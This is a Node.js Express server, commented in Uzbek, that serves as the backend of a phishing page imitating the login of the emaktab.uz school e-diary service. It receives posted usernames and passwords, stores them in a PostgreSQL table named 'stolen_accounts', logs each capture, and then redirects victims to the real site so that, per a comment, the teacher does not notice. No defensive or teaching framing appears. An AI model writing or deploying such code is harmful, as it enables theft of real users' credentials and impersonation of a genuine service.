const express = require("express");
const { Pool } = require("pg");
const path = require("path");
const app = express();

// 1. PostgreSQL ulanishi
const pool = new Pool({
  user: "postgres", // Postgres foydalanuvchi nomi
  host: "localhost",
  database: "phishing_db", // Bazangiz nomi
  password: "qwerty", // Postgres parolingiz
  port: 5432,
});

app.use(express.urlencoded({ extended: true }));
app.use(express.static("public")); // Sahifani ko'rsatish uchun

// 2. Ma'lumotni qabul qilish
app.post("/auth/login", async (req, res) => {
  const { login, password } = req.body;

  try {
    // Ma'lumotni PostgreSQL bazasiga yozamiz
    await pool.query(
      "INSERT INTO stolen_accounts (login, password) VALUES ($1, $2)",
      [login, password],
    );

    console.log(`Baza yangilandi: ${login} tutildi!`);

    // 3. Ustoz sezib qolmasligi uchun haqiqiy saytga yuboramiz
    res.redirect("https://login.emaktab.uz");
  } catch (err) {
    console.error("Xatolik:", err);
    res.redirect("https://login.emaktab.uz");
  }
});

app.listen(3000, () =>
  console.log("Server http://localhost:3000 da ishga tushdi"),
);
